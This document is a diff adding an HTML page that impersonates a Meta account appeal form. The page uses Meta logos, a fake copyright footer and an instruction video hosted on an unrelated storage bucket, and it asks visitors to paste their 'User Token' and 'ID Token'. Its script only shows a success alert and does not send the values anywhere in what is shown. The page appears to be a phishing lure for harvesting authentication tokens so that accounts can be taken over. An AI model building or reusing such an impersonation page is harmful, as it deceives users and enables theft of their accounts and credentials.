@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Meta | Appeal Submission</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" />
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      padding: 30px;
+      max-width: 600px;
+      width: 100%;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .header img {
+      width: 35px;
+    }
+
+    .header h2 {
+      font-size: 20px;
+      margin: 0;
+      color: #1c1e21;
+    }
+
+    video {
+      width: 100%;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .guidelines {
+      background: #f5f6f7;
+      padding: 15px;
+      border-radius: 6px;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .guidelines p {
+      margin-bottom: 10px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 15px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #155dcb;
+    }
+
+    .footer {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 12px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Meta_Platforms_Inc._logo.svg/512px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
+      <h2>Appeal Submission</h2>
+    </div>
+
+    <video controls>
+      <source src="https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+
+    <div class="guidelines">
+      <p><strong>Please watch the video above for instructions on submitting your appeal</strong></p>
+      <ul>
+        <li>We promote respectful communication and prohibit hate speech, bullying, and harassment.</li>
+        <li>We remove content that could lead to real-world harm, including violence, criminal activity, or dangerous organizations.</li>
+        <li>We protect personal privacy and intellectual property rights, requiring permission to share private content.</li>
+        <li>We maintain platform authenticity by preventing spam, fake engagement, and misinformation.</li>
+      </ul>
+    </div>
+
+    <label for="userToken"><strong>User Token</strong></label>
+    <input type="text" id="userToken" placeholder="Enter your user token" />
+
+    <label for="idToken"><strong>ID Token</strong></label>
+    <input type="text" id="idToken" placeholder="Enter your ID token" />
+
+    <button onclick="submitAppeal()">➤ Submit Appeal</button>
+
+    <div class="footer">
+      © 2025 Meta Platforms, Inc.
+    </div>
+  </div>
+
+  <script>
+    function submitAppeal() {
+      const userToken = document.getElementById('userToken').value.trim();
+      const idToken = document.getElementById('idToken').value.trim();
+
+      if (!userToken || !idToken) {
+        alert("Please fill in both tokens to proceed.");
+        return;
+      }
+
+      alert("✅ Your appeal has been submitted successfully.");
+    }
+  </script>
+</body>
+</html>
